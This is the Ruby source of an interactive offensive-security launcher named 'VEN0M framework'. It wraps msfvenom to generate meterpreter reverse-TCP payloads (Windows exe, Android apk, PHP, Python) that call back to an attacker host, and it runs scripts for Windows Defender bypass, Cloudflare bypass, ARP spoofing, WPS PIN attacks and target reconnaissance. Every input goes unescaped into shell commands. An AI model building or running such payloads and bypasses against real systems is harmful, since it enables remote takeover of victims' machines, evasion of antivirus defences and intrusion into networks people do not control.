system("service postgresql start")
system("service tor start")
system("printf '\033]2;VEN0M FRAMEWORK | @tuf_unkn0wn\a'")
system("clear")
require 'socket'
def mainbanner()
	print """\e[31m
██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝\e[32m
  ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
     ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
      ░     ░  ░         ░     ░ ░         ░   
     ░                                         
\e[0m\n
	"""
end
mainbanner()
loop do
print "\n\e[1m[\e[32m\e[5mVEN0M\e[0m\e[1m]>:\e[0m "
type = gets.chomp
if type == "?"
	print """\e[92m 
        ▄█    █▄   ▄███████▄  ▄█        ▄███████▄ 
       ███    ███ ███    ███ ███       ███    ███ 
       ███    ███ ███    █▀  ███       ███    ███ 
       ███▄▄▄▄███ ███▄▄▄     ███       ███    ███ 
       ███▀▀▀▀███ ███▀▀▀     ███       ████████▀  
       ███    ███ ███    █▄  ███       ███        
       ███    ███ ███    ███ ███▌    ▄ ███        
        ▀█    █▀  ▀█████████ █████▄▄██ ███\e[0m 
------------------------------------------------------
|                 \e[32mStandard Commands\e[0m                  |
------------------------------------------------------
|\e[33m ? \e[0m|\e[33m shows this banner\e[0m |                            |
------------------------------------------------------
|\e[33m update \e[0m|\e[33m update the venom framework\e[0m |              |
------------------------------------------------------
|\e[33m upgrade \e[0m|\e[33m update your linux os\e[0m |                   |
------------------------------------------------------
| \e[33mls\e[0m | \e[33mshows all files in a directory\e[0m |              |
------------------------------------------------------    
| \e[33mmyip\e[0m |\e[33m shows your local and public ip\e[0m |            |
------------------------------------------------------
| \e[33mbanner\e[0m |\e[33m clears screen and shows banner\e[0m |          |
------------------------------------------------------
| \e[33mexit\e[0m |\e[33m exits the venom framework\e[0m |                 |
------------------------------------------------------
| \e[33mclear\e[0m |\e[33m clears the screen\e[0m |                        |
------------------------------------------------------
| \e[33mrm\e[0m |\e[33m remove a file\e[0m |                               |
------------------------------------------------------
| \e[33mcommand\e[0m |\e[33m execute a terminal command\e[0m |             |
------------------------------------------------------
| \e[33mnterm\e[0m |\e[33m open a new terminal window\e[0m |               |
------------------------------------------------------
|                 \e[32mPayload Commands\e[0m                   |
------------------------------------------------------
| \e[33mcustompay\e[0m |\e[33m make any payload\e[0m |                     |
------------------------------------------------------
| \e[33mwinload\e[0m |\e[33m windows reverse_tcp payload\e[0m |            |
------------------------------------------------------
| \e[33mandload\e[0m |\e[33m android reverse_tcp payload\e[0m |            |
------------------------------------------------------
| \e[33mphpload\e[0m |\e[33m php reverse_tcp payload\e[0m |                |
------------------------------------------------------
| \e[33mpyload\e[0m |\e[33m python reverse_tcp payload\e[0m |              |
------------------------------------------------------
| \e[33mwinbyp\e[0m |\e[33m windows defender bypass\e[0m |                 |
------------------------------------------------------
|                 \e[32mWireless Commands\e[0m                  |
------------------------------------------------------
| \e[33mnetdev\e[0m |\e[33m scan for devices in your network\e[0m |        |
------------------------------------------------------
| \e[33mmon\e[0m |\e[33m put your device in monitor mode\e[0m |            |
------------------------------------------------------
| \e[33mmonoff\e[0m |\e[33m put your device out of monitor mode\e[0m |     |
------------------------------------------------------
| \e[33mscannet\e[0m |\e[33m scan for networks around you\e[0m |           |
------------------------------------------------------
| \e[33mspecnet\e[0m |\e[33m scan a specific network\e[0m |                |
------------------------------------------------------
| \e[33mreaver\e[0m |\e[33m reaver automated\e[0m |                        |
------------------------------------------------------
| \e[33marpspoof\e[0m |\e[33m Arp Spoofing\e[0m |                          |
------------------------------------------------------
| \e[33mpingen\e[0m |\e[33m Get a routers default pin\e[0m |               |
------------------------------------------------------
|                 \e[32mMetasploit Modules\e[0m                 |
------------------------------------------------------
| \e[33mmsfex\e[0m |\e[33m show all metasploit exploits\e[0m |             |
------------------------------------------------------
| \e[33mmsfpa\e[0m |\e[33m show all metasploit payloads\e[0m |             |
------------------------------------------------------
| \e[33mmsfau\e[0m |\e[33m show all metasploit auxiliary\e[0m |            |
------------------------------------------------------
| \e[33mmsfev\e[0m |\e[33m show all metasploit evasions\e[0m |             |
------------------------------------------------------
| \e[33mmsfpo\e[0m |\e[33m show all metasploit post\e[0m |                 |
------------------------------------------------------
| \e[33mmsfno\e[0m |\e[33m show all metasploit nops\e[0m |                 |
------------------------------------------------------
| \e[33mmsfen\e[0m |\e[33m show all metasploit encoders\e[0m |             |
------------------------------------------------------
| \e[33mmsfall\e[0m |\e[33m show all metasploit modules\e[0m |             |
------------------------------------------------------
|                 \e[32mPrivacy / Security\e[0m                 |
------------------------------------------------------
| \e[33mchains\e[0m |\e[33m browse web with proxychains\e[0m |             |
------------------------------------------------------
| \e[33mmacc\e[0m |\e[33m mac address changer\e[0m |                       |
------------------------------------------------------
| \e[33mmacoff\e[0m |\e[33m put mac address back to default\e[0m |         |
------------------------------------------------------
|                 \e[32mInformation Gathering\e[0m              |
------------------------------------------------------
| \e[33msinfo\e[0m |\e[33m run a info scan on a target\e[0m |              |
------------------------------------------------------
| \e[33mports\e[0m |\e[33m port scan a target\e[0m |                       |
------------------------------------------------------
| \e[33msource\e[0m |\e[33m get source code of web server\e[0m |           |
------------------------------------------------------
| \e[33mdirscan\e[0m |\e[33m directory bruteforce a webserver\e[0m |       |
------------------------------------------------------
|                 \e[32mOther Commands\e[0m                     |
------------------------------------------------------
| \e[33mserver\e[0m |\e[33m start a apache server\e[0m |                   |
------------------------------------------------------
| \e[33mserveroff\e[0m |\e[33m stop the apache server\e[0m |               |
------------------------------------------------------
| \e[33mmsfcon\e[0m |\e[33m run the metasploit-framework\e[0m |            |
------------------------------------------------------
| \e[33msetoolkit\e[0m |\e[33m run setoolkit\e[0m |                        |
------------------------------------------------------
| \e[33mwafwoof\e[0m |\e[33m Web Application Firewall Detection Tool\e[0m ||
------------------------------------------------------
| \e[33mcloudf\e[0m |\e[33m Cloudflare bypass\e[0m |                       |
------------------------------------------------------
	\n"""
end
if type == "ls"
	print "hit enter for the directory your in\n"
	print "\e[34mDirectory To View:\e[0m "
	path = gets.chomp
	system("ls #{path}")
	print "\n"
end

if type == "exit"
	abort("\nfollow \e[32m@tuf_unkn0wn\e[0m on instagram")
end
if type == "myip"
	print "\n    Router/Public IP"
	print "\n----------------------------\n\e[32m"
	system('curl "http://myexternalip.com/raw"')
	print "\n\e[0m----------------------------\n"
	print "\n"
	print "\n    Local/Private IP"
	print "\n----------------------------\n\e[32m"
	print Socket.ip_address_list[1].ip_address
	print "\n\e[0m----------------------------\n"

end
if type == "clear"
	system("clear")
end
if type == "banner"
	system("clear")
	mainbanner()
end
if type == "winload"
	print "LHOST: "
	lhost = gets.chomp
	print "LPORT: "
	lport = gets.chomp
	print "File Name: "
	fname = gets.chomp
	system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o /root/#{fname}.exe")
end
if type == "andload"
	print "LHOST: "
	lhost = gets.chomp
	print "LPORT: "
	lport = gets.chomp
	print "File Name: "
	fname = gets.chomp
	system("msfvenom -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -o /root/#{fname}.apk")
end
if type == "phpload"
	print "LHOST: "
	lhost = gets.chomp
	print "LPORT: "
	lport = gets.chomp
	print "File Name: "
	fname = gets.chomp
	system("msfvenom -p php/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -o /root/#{fname}.php")
end
if type == "rm"
	print "Filename / File Path\n"
	print ">: "
	file = gets.chomp
	print "\n\e[31mARE YOU SURE YOU WANT TO DELETE\e[0m #{file}  \e[33m [y/n]\e[0m\n"
	yn = gets.chomp
	if yn == "y"
		system("rm #{file}")
		print "\n#{file} has been deleted\n"
	end
	if yn == "n"
		system("")
	end
end
if type == "command"
	print "\e[32mCommand:\33[0m "
	command = gets.chomp
	system("#{command}")
end
if type == "pyload"
	print "LHOST: "
	lhost = gets.chomp
	print "LPORT: "
	lport = gets.chomp
	print "File Name: "
	fname = gets.chomp
	system("msfvenom -p python/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -o /root/#{fname}.py")
end
if type == "update"
	system("cd /root/venom/ && ruby venomupdate.rb")
end
if type == "upgrade"
	system("apt update && apt upgrade")
end
if type == "netdev"
	system("netdiscover")
end
if type == "mon"
	system("iwconfig\n")
	print "\e[1m\e[34mSelect Interface\e[0m: "
	interface = gets.chomp
	system("airmon-ng start #{interface}")
end
if type == "monoff"
	system("iwconfig\n")
	print "\e[1m\e[34mSelect Interface\e[0m: "
	interface = gets.chomp
	system("airmon-ng stop #{interface}")
end
if type == "scannet"
	system("iwconfig")
	print "\e[1mSelect Interface:\e[0m "
	interface = gets.chomp
	print "\e[33mWOULD YOU LIKE TO SAVE YOUR SCAN RESULTS?\e[0m\n"
	print "[y/n]> "
	yn = gets.chomp
	if yn == "y"
		system("airmon-ng start #{interface}")
		system("airodump-ng -w /root/SCAN #{interface}")
		print "\e[33m! SCAN RESULTS SAVED IN /root/ DIRECTORY !\e[0m"
		system("airmon-ng stop #{interface}0mon")
	end	
	if yn == "n"
		system("airmon-ng start #{interface}")
		system("airodump-ng #{interface}")
		system("airmon-ng stop #{interface}0mon")
	end
end
if type == "msfex"
	system("service postgresql start")
	system("""msfconsole -q -x 'show exploits'""")
end
if type == "msfpa"
	system("service postgresql start")
	system("""msfconsole -q -x 'show payloads'""")
end
if type == "msfau"
	system("service postgresql start")
	system("""msfconsole -q -x 'show auxiliary'""")
end
if type == "msfev"
	system("service postgresql start")
	system("""msfconsole -q -x 'show evasion'""")
end
if type == "msfpo"
	system("service postgresql start")
	system("""msfconsole -q -x 'show post'""")
end
if type == "msfno"
	system("service postgresql start")
	system("""msfconsole -q -x 'show nops'""")
end
if type == "msfen"
	system("service postgresql start")
	system("""msfconsole -q -x 'show encoders'""")
end
if type == "msfall"
	system("service postgresql start")
	system("""msfconsole -q -x 'show all'""")
end
if type == "reaver"
	system("iwconfig")
	print "Select Interface: "
	interface = gets.chomp
	print "BSSID: "
	bssid = gets.chomp
	system("reaver -i #{interface} -b #{bssid} -vv")
end
if type == "arpspoof"
	system("python /root/venom/tools/arpspoof.py")
end
if type == "chains"
	print "Browser: "
	browser = gets.chomp
	print "Website: "
	website = gets.chomp
	system("proxychains #{browser} #{website}")
end
if type == "macc"
	system("iwconfig\n")
	print "Select Interface: "
	interface = gets.chomp
	system('ifconfig #{interface} down')
	system("macchanger -r #{interface}")
	system('ifconfig #{interface} up')
end
if type == "macoff"
	system("iwconfig\n")
	print "Select Interface: "
	interface = gets.chomp
	system("ifconfig #{interface} down")
	system("macchanger -p #{interface}")
	system("ifconfig #{interface} up")
end
if type == "sinfo"
	print "\e[1mTarget:\e[0m "
	target = gets.chomp
	print "-------------\n"
	print "\e[32mDOCUMENT INFO\e[0m\n"
	print "-------------\n"
	system("curl --head #{target}")
	print "-----------\n"
	print "\e[32mSOURCE CODE\e[0m\n"
	print "-----------\n"
	system("curl #{target}")
	print "------------------------------------------------------------------------------------\n"
	print "\e[32mNMAP SCAN (OS detection, version detection, ports, script scanning, and traceroute)\e[0m\n"
	print "------------------------------------------------------------------------------------\n"
	system("nmap -A #{target}")
end
if type == "ports"
	print "\e[1mTarget:\e[0m "
	target = gets.chomp
	system("nmap #{target}")
end
if type == "source"
	print "\e[1m\e[34mTarget:\e[0m "
	target = gets.chomp
	print "\n\e[33mWould you like to save source code in a file?\n\e[0m"
	print "\e[31m[y/n]:\e[0m "
	yn = gets.chomp
	if yn == "n"
		print "-----------\n"
		print "\e[32mSOURCE CODE\e[0m\n"
		print "-----------\n"
		system("curl #{target}")
		print "\n\e[32m---------------------------------------------------------------------\e[0m\n"
	end
	if yn == "y"
		system("curl #{target} >> /root/#{target}.txt")
		print "\nfile saved > /root/#{target}.txt\e[0m"
	end
end
if type == "nterm"
	system("gnome-terminal")
end
if type == "dirscan"
	print "\e[1m\e[34mTarget URL:\e[91m "
	target = gets.chomp
	print "\e[0m"
	system("dirb #{target}")
end
if type == "server"
	print "\n\e[32m\e[1mStarting Server...\n\e[0m"
	system("service apache2 start")
	print "\n----------------------------\n"
	print "\e[1mServer:\e[32m http://", Socket.ip_address_list[1].ip_address
	print "\n\e[0m----------------------------\n"
end
if type == "serveroff"
	print "\n\e[32m\e[1mStopping Server...\n\e[0m"
	system("service apache2 stop")
	print "\n\e[32m\e[1mServer Off\n\e[0m"
end
if type == "msfcon"
	system("service postgresql start")
	system("msfconsole")
end
if type == "setoolkit"
	system("setoolkit")
end
if type == "winbyp"
	system("python /root/venom/tools/winbyp.py")
end
if type == "custompay"
	system("cat /root/venom/tools/payloads.txt")
	print "\n"
	print "\e[1m\e[32mPayload:\e[0m "
	pay = gets.chomp
	print "\e[1m\e[32mLHOST:\e[0m "
	lhost = gets.chomp
	print "\e[1m\e[32mLPORT:\e[0m "
	lport = gets.chomp
	print "\n\e[1mExamples:\e[32m py, php, exe\n\e[0m"
	print "\e[1m\e[32mFile Format:\e[0m "
	format = gets.chomp
	print "\e[1m\e[32mFile Name:\e[0m "
	name = gets.chomp
	system("msfvenom -p #{pay} LHOST=#{lhost} LPORT=#{lport} -o /root/#{name}.#{format}")
end
if type == "wafwoof"
	print "\e[1m\e[32mTarget:\e[0m "
	target = gets.chomp
	system("wafw00f #{target}")
end
if type == "cloudf"
	system("python /root/venom/tools/cloudflare.py")
end
if type == "specnet"
	print "\e[1mBSSID:\e[0m "
	bssid = gets.chomp
	print "\e[1mESSID:\e[0m "
	essid = gets.chomp
	system("iwconfig")
	print "\n\e[1mSelect Interface:\e[0m "
	interface = gets.chomp
	print "\e[33m\e[1mWOULD YOU LIKE TO SAVE YOUR SCAN RESULTS?\e[0m\n"
	print "[y/n]> "
	yn = gets.chomp
	if yn == "y"
		a = "airodump-ng -w /root/SCAN --bssid #{bssid} --essid #{essid} #{interface}"
		system(a)
	end
	if yn == "n"
		a = "airodump-ng --bssid #{bssid} --essid #{essid} #{interface}"
		system(a)
	end
end
if type == "pingen"
	print "\e[32m\e[1mBSSID:\e[0m "
	bssid = gets.chomp
	system("python /root/venom/tools/pingen.py #{bssid}")
end
end
